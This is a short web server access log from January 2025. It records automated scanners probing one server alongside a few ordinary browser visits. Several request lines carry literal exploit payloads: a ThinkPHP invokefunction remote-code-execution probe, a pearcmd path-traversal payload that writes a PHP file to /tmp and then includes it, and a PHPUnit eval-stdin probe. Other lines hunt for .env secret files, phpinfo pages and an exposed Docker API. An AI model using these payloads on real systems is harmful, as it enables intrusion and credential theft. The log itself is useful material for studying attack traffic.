49.175.89.60 - - [13/Jan/2025:12:12:46 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:46 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:47 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:47 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:48 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.175.89.60 - - [13/Jan/2025:12:12:48 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
49.112.136.3 - - [13/Jan/2025:12:25:33 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
49.112.136.3 - - [13/Jan/2025:12:25:33 +0000] "GET /js/brand.js HTTP/1.1" 200 569 "http://35.220.248.27/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
49.112.136.3 - - [13/Jan/2025:12:25:33 +0000] "GET /js/login.js HTTP/1.1" 200 922 "http://35.220.248.27/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
49.112.136.3 - - [13/Jan/2025:12:25:34 +0000] "GET /js/services/LoggerService.js HTTP/1.1" 200 1344 "http://35.220.248.27/js/login.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
49.112.136.3 - - [13/Jan/2025:12:25:34 +0000] "GET /js/utils/json-manipulator.js HTTP/1.1" 200 564 "http://35.220.248.27/js/brand.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
87.120.115.34 - - [13/Jan/2025:12:28:02 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:12:40:14 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:12:40:14 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
139.59.101.104 - - [13/Jan/2025:12:58:38 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
95.214.55.226 - - [13/Jan/2025:13:06:54 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
141.94.145.70 - - [13/Jan/2025:13:11:40 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
78.153.140.148 - - [13/Jan/2025:13:11:47 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [13/Jan/2025:13:11:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [13/Jan/2025:13:14:48 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
